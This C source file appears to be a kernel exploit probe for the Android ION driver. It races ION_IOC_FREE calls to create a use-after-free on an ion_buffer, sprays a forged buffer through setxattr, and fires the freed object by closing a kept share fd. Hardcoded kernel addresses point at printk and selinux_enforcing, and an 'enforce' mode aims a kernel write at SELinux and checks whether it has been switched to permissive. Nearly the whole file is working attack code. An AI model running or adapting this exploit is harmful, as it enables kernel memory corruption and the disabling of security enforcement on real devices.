#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/xattr.h>

/* v3 probe: reach-or-quit, no kernel writes outside our own pages.
 *
 * Mechanism (see ledger 23): a racing ION_IOC_FREE storm makes an EXTRA
 * kref_put land on the kmalloc-64 slot that our NEXT allocation reused, i.e. on
 * a LIVE ion_handle -> that handle is destroyed early -> its ion_buffer_put
 * frees the buffer while the ION_IOC_SHARE fd we kept still references it.
 * close() of that kept fd is then a second ion_buffer_put we can fire whenever
 * we want, so a 192-byte setxattr template can sit in the freed slot first.
 *
 * Everything the fake ion_buffer points at is OUR OWN userspace memory, so in
 * probe mode the kernel only writes inside our pages. Three independent
 * in-process oracles tell us whether the fake buffer was actually used:
 *   heap+0xe8  decremented by buffer->size   (atomic_sub in ion_buffer_destroy)
 *   dev+0x10   zeroed by rb_erase            (__rb_change_child)
 *   dmesg      shows the marker via printk  (ops[0x20]/[0x30]/[0x08])
 * Stop immediately on any hit.
 */
#define IB_REF 0x00
#define IB_NODE 0x08
#define IB_DEV 0x20
#define IB_HEAP 0x28
#define IB_SIZE 0x40
#define IB_KMAP 0x78
#define IB_SG 0x88
#define IB_PAGES 0x90
#define IB_VMAS 0x98
#define IB_HCNT 0xa8
#define IH_OPS 0x38
#define IH_FLAGS 0x40
#define IH_ATOMIC 0xe8
#define HEAP_OFF (IH_ATOMIC / 4)

#define ION_ALLOC 0xc0204900u
#define ION_FREE  0xc0044901u
#define ION_SHARE 0xc0084904u
#define PRINTK    0xffffffc000d8fad8UL
#define SELINUX_ENFORCING 0xffffffc00189be74UL
#define RB_RIGHT_OFF 8   /* struct rb_node: pc, rb_right(+8), rb_left(+0x10) */

struct alloc_data { unsigned long long len, align; unsigned mask, flags; unsigned handle; unsigned pad; };
struct fd_data { unsigned handle; int fd; };

#define SPRAY_SZ 192
#define MAXR 24
static int g_nracer = 2, g_nspray = 16, g_heapbit = 9, g_enforce = 0;
static unsigned long g_parent_user; static int g_hcnt = 5;
static unsigned char g_tmpl[SPRAY_SZ];
static unsigned *g_heap_pg, *g_dev_pg, *g_ops_pg;
static char g_path[128] = "/data/local/tmp/ib_probe_file";
static volatile int g_stop, g_go, g_ready, g_done;
static volatile unsigned g_id;
static int g_cfd[MAXR], g_sfd[MAXR], g_nrec;
static unsigned g_h[MAXR];

static void *racer(void *a)
{
    unsigned id = g_id;
    int fd = g_cfd[g_nrec - 1];
    g_ready++;
    while (!g_go) sched_yield();
    ioctl(fd, ION_FREE, &id);
    g_done++;
    return NULL;
}

static void *sprayer(void *a)
{
    int i;
    while (!g_stop) {
        for (i = 0; i < 100; i++) {
            if (g_stop) break;
            setxattr(g_path, "user.v", g_tmpl, SPRAY_SZ, 0);
        }
        sched_yield();
    }
    return NULL;
}

static void build_template(const char *marker)
{
    memset(g_tmpl, 0, SPRAY_SZ);
    memset(g_heap_pg, 0, 4096);
    memset(g_dev_pg, 0, 4096);
    memset(g_ops_pg, 0, 4096);
    strcpy((char *)g_heap_pg, marker);                       /* printk fmt */
    *(unsigned long *)((char *)g_heap_pg + IH_OPS) = (unsigned long)g_ops_pg;
    *(unsigned long *)((char *)g_heap_pg + IH_FLAGS) = 0;    /* -> ion_buffer_destroy */
    *(unsigned long *)((char *)g_ops_pg + 0x08) = PRINTK;    /* free          */
    *(unsigned long *)((char *)g_ops_pg + 0x20) = PRINTK;    /* map_dma_buf   */
    *(unsigned long *)((char *)g_ops_pg + 0x30) = PRINTK;    /* unmap_dma_buf */

    *(unsigned int *)(g_tmpl + IB_REF) = 1;                  /* put -> destroy */
    *(unsigned long *)(g_tmpl + IB_NODE) = (g_enforce ? SELINUX_ENFORCING - RB_RIGHT_OFF
                                            : (unsigned long)g_dev_pg) | 1;   /* RED: no rebalance */
    *(unsigned long *)(g_tmpl + IB_NODE + 8) = 0;
    *(unsigned long *)(g_tmpl + IB_NODE + 16) = 0;
    *(unsigned long *)(g_tmpl + IB_DEV) = (unsigned long)g_dev_pg;
    *(unsigned long *)(g_tmpl + IB_HEAP) = (unsigned long)g_heap_pg;
    *(unsigned long *)(g_tmpl + IB_SIZE) = 1;                /* subtrahend */
    *(unsigned long *)(g_tmpl + IB_VMAS) = (unsigned long)(g_tmpl + IB_VMAS);
    *(unsigned long *)(g_tmpl + IB_VMAS + 8) = (unsigned long)(g_tmpl + IB_VMAS);
    *(unsigned int *)(g_tmpl + IB_HCNT) = g_hcnt;   /* stay >0: never enters the atomic_sub branch -> no BUG_ON */
    /* canaries */
    g_dev_pg[4] = 0xdeadbeefu;        /* dev+0x10 <- rb_erase writes 0 here (index 4) */
    g_heap_pg[HEAP_OFF] = 0x5000u;    /* heap+0xe8 <- decremented by size    */
}

static int check_oracles(void)
{
    if (g_dev_pg[4] == 0)            { printf("  ORACLE: dev+0x10 zeroed by rb_erase\n"); return 1; }
    if (g_heap_pg[HEAP_OFF] != 0x5000u) {
        printf("  ORACLE: heap+0xe8 moved 0x%x -> 0x%x (atomic_sub ran)\n",
               0x5000u, g_heap_pg[HEAP_OFF]);
        return 1;
    }
    if (g_dev_pg[4] != 0xdeadbeefu)  { printf("  ORACLE: dev+0x10 changed to %08x\n", g_dev_pg[4]); return 1; }
    return 0;
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IOLBF, 0);
    int rounds = argc > 1 ? atoi(argv[1]) : 8;
    int i, j, fd;
    pthread_t th[40];
    char marker[64] = "XPLAY6_PROBE_REACHED\n";
    int hit = 0;

    if (argc > 2) g_heapbit = atoi(argv[2]);
    if (argc > 3) g_nracer = atoi(argv[3]);
    if (argc > 4 && !strcmp(argv[4], "enforce")) g_enforce = 1;
    fd = open(g_path, O_RDWR | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) { perror("spray file"); return 1; }
    close(fd);
    for (i = 0; i < 3; i++) {
        void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (p == MAP_FAILED) { perror("mmap"); return 1; }
        if (i == 0) g_heap_pg = p;
        if (i == 1) g_dev_pg = p;
        if (i == 2) g_ops_pg = p;
    }
    build_template(marker);
    printf("probe: enforce=%d hcnt=%d heapbit=%d nracer=%d rounds=%d heap=%p dev=%p ops=%p\n",
           g_enforce, g_hcnt, g_heapbit, g_nracer, rounds, (void *)g_heap_pg, (void *)g_dev_pg, (void *)g_ops_pg);
    printf("  canary dev+0x10=%08x heap+0xe8=%08x\n", g_dev_pg[4], g_heap_pg[HEAP_OFF]);

    /* phase 1: create dangling buffers (fresh client per round) */
    for (i = 0; i < rounds && !hit; i++) {
        struct alloc_data ad;
        struct fd_data sd;
        int cfd = open("/dev/ion", O_RDONLY);
        if (cfd < 0) { perror("open /dev/ion"); break; }
        memset(&ad, 0, sizeof ad);
        ad.len = 0x2000; ad.align = 4096; ad.mask = 1u << g_heapbit;
        errno = 0;
        if (ioctl(cfd, ION_ALLOC, &ad)) { printf("round %d alloc errno=%d\n", i, errno); close(cfd); continue; }
        memset(&sd, 0, sizeof sd); sd.handle = ad.handle;
        errno = 0;
        if (ioctl(cfd, ION_SHARE, &sd)) { printf("round %d share errno=%d\n", i, errno); close(cfd); continue; }
        g_cfd[g_nrec] = cfd; g_sfd[g_nrec] = sd.fd; g_h[g_nrec] = ad.handle; g_nrec++;

        g_id = ad.handle; g_go = 0; g_ready = 0; g_done = 0;
        for (j = 0; j < g_nracer; j++)
            pthread_create(&th[j], NULL, racer, (void *)(long)j);
        while (g_ready < (unsigned)g_nracer) sched_yield();
        g_go = 1;
        while (g_done < (unsigned)g_nracer) sched_yield();
        for (j = 0; j < g_nracer; j++) pthread_join(th[j], NULL);
        printf("  round %d ok (id=%u sfd=%d)\n", i, ad.handle, g_sfd[g_nrec-1]);
        if (check_oracles()) { printf("  hit during phase 1 (round %d)\n", i); hit = 1; }
        if (g_enforce) {
            FILE *f = popen("getenforce", "r"); char l[64] = "";
            if (f) { if (fgets(l, sizeof l, f)) {} pclose(f); }
            if (strstr(l, "Permissive")) { printf("  *** SELINUX OFF at round %d\n", i); hit = 1; }
        }
    }
    printf("phase1 done: %d clients, %d dangling share fds\n", g_nrec, g_nrec);

    /* phase 2: spray the 192-byte template, then fire close() one fd at a time */
    if (!hit) {
        build_template(marker);
        for (i = 0; i < g_nspray; i++)
            pthread_create(&th[i], NULL, sprayer, (void *)(long)i);
        for (i = g_nrec - 1; i >= 0 && !hit; i--) {
            int k;
            for (k = 0; k < 6; k++) {
                setxattr(g_path, "user.v", g_tmpl, SPRAY_SZ, 0);
                sched_yield();
            }
            close(g_sfd[i]);                      /* the delayed ion_buffer_put */
            usleep(2000);
            if (check_oracles()) { printf("  HIT via share fd of client %d\n", i); hit = 1; }
        }
        g_stop = 1;
        for (i = 0; i < g_nspray; i++) pthread_join(th[i], NULL);
    }

    for (i = 0; i < g_nrec; i++) { if (g_sfd[i] > 0) close(g_sfd[i]); close(g_cfd[i]); }
    printf("RESULT: %s\n", hit ? "REACHED (fake ion_buffer was used)" : "no reach this run");
    return hit ? 0 : 3;
}
